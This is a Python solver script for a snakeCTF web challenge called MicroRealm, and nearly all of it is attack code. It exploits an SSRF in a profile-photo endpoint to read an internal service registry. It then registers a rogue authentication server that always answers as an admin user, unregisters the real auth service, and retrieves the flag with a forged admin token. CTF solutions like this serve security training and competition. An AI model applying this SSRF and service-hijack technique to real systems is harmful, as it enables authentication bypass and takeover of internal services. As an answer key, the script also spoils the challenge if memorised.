import argparse
import dataclasses
import http.server
import json
import re
import socketserver
import threading
import time
from base64 import b64decode
from urllib.parse import urlencode

import httpx

# Configuration
WAYFINDER_URL = "http://wayfinder:8080"  # Internal wayfinder service
PIRATE_PORT = 9999

FLAG_RE = re.compile(r"snakeCTF\{.*\}")


@dataclasses.dataclass()
class ServiceModel:
    service_address: str
    service_port: str
    service_type: str


class PirateAuthHandler(http.server.BaseHTTPRequestHandler):
    """
    Pirate auth service that mimics buccaneer but always returns admin users
    """

    def log_message(self, format, *args):
        """Suppress default logging"""
        pass

    def do_GET(self):
        """Handle GET requests"""

        print("Received request:", self.path)
        if self.path.startswith("/verify-token"):
            # Always return an admin user
            user = {
                "id": 1,
                "username": "admin",
                "password_hash": "admin",
                "is_admin": True,
            }

            self.send_response(200)
            self.send_header("Content-type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps(user).encode())

        elif self.path.startswith("/login"):
            # Return a fake token
            token = "admin_token"

            self.send_response(200)
            self.send_header("Content-type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"token": token}).encode())

        else:
            self.send_response(404)
            self.end_headers()


def start_pirate_server():
    """Start the pirate auth server in a background thread"""
    handler = PirateAuthHandler

    with socketserver.TCPServer(("", PIRATE_PORT), handler) as httpd:
        print(f"[+] Pirate auth server running on port {PIRATE_PORT}")
        httpd.serve_forever()


def exploit_ssrf(session: httpx.Client, url, token, target_url):
    """
    Exploit SSRF vulnerability in /set-user-photo endpoint
    The photo controller makes an HTTP GET request to the provided URL
    """
    print(f"[*] Exploiting SSRF to access: {target_url}")

    payload = {"photo_url": target_url}

    headers = {"Authorization": f"Bearer {token}"}

    try:
        response = session.post(
            f"{url}/profile/update-photo",
            data=payload,
            headers=headers,
            timeout=5,
        )

        if response.status_code == 200:
            print(f"[+] SSRF successful: {response.status_code}")
            return True
        else:
            print(response.text)
            print(f"[-] SSRF failed: {response.status_code}")
            return False
    except Exception as e:
        print(f"[-] SSRF error: {e}")
        return False


def main(url: str, pirate_host: str, pirate_port: str):
    # Step 1: Start pirate auth server
    print("\n[STEP 1] Starting pirate auth server...")
    server_thread = threading.Thread(target=start_pirate_server, daemon=True)
    server_thread.start()
    time.sleep(2)  # Give server time to start

    # Step 2: Register a normal user on sloop
    print("\n[STEP 2] Registering user on sloop...")
    username = "asdfasdf"
    password = "asdfasdf"

    session = httpx.Client(verify=False)

    try:
        register_response = session.post(
            f"{url}/register",
            data={"username": username, "password": password},
            timeout=5,
        )

        token = register_response.cookies.get("token")
        print(f"[+] Registered successfully. Token: {token[:20]}...")

    except Exception as e:
        print(f"[-] Registration error: {e}")
        return

    # Step 3: Retrieve auth service IP
    print("\n[STEP 3] Retrieving buccaneer service IP...")
    get_service_url = f"{WAYFINDER_URL}/get-service?service_type=buccaneer"

    buccaneer_ip = None
    buccaneer_port = None
    if exploit_ssrf(session, url, token, get_service_url):
        try:
            service_response = session.get(f"{url}/profile", timeout=5)
            service_response.raise_for_status()
            service_data = service_response.read()

            photo = service_data.split(b'<img src="data:image/jpeg;base64,')[1]
            photo = photo.split(b'" alt="user photo"/>')[0]

            data = b64decode(photo)
            data = json.loads(data)

            buccaneer_ip = data["ip"]
            buccaneer_port = int(data["port"])
            print(f"[+] Buccaneer service at {buccaneer_ip}:{buccaneer_port}")
        except Exception as e:
            print(f"[-] Failed to get buccaneer service info: {e}")
            return

    # Step 3: Register our pirate auth service
    print("\n[STEP 3] Registering pirate auth service...")

    register_params = ServiceModel(
        service_address=pirate_host,
        service_port=str(pirate_port),
        service_type="buccaneer",
    )
    register_url = (
        f"{WAYFINDER_URL}/register?{urlencode(dataclasses.asdict(register_params))}"
    )

    if exploit_ssrf(session, url, token, register_url):
        print("[+] Successfully registered pirate auth service")
    else:
        print("[-] Failed to register pirate auth service")
        return

    # Step 4: Unregister the real buccaneer service
    print("\n[STEP 4] Unregistering legitimate buccaneer service...")
    unregister_params = ServiceModel(
        service_address=buccaneer_ip,
        service_port=str(buccaneer_port),
        service_type="buccaneer",
    )
    unregister_url = (
        f"{WAYFINDER_URL}/unregister?{urlencode(dataclasses.asdict(unregister_params))}"
    )

    if exploit_ssrf(session, url, token, unregister_url):
        print("[+] Successfully unregistered buccaneer service")
    else:
        print("[-] Failed to unregister buccaneer service")
        return

    time.sleep(1)

    # Step 6: Get the flag
    print("\n[STEP 6] Retrieving the flag...")
    headers = {"Authorization": "Bearer admin_token"}

    flag_response = session.get(f"{url}/get-flag", headers=headers, timeout=10)
    flag_response.raise_for_status()

    payload = flag_response.text
    flag = FLAG_RE.search(payload)
    flag_data = flag.group(0)
    print(f"[+] Flag: {flag_data}")

    input("Press any key to exit...")


if __name__ == "__main__":
    # Parse command-line arguments
    parser = argparse.ArgumentParser(
        description="Automated solver for MicroRealm CTF Challenge",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument(
        "--url", default="http://127.0.0.1:8080", help="Harbor service host"
    )
    # This needs to be reachable from the internet!
    parser.add_argument("--pirate-host", help="Pirate server URL")
    parser.add_argument("--pirate-port", help="Pirate server URL")

    args = parser.parse_args()

    main(url=args.url, pirate_host=args.pirate_host, pirate_port=args.pirate_port)
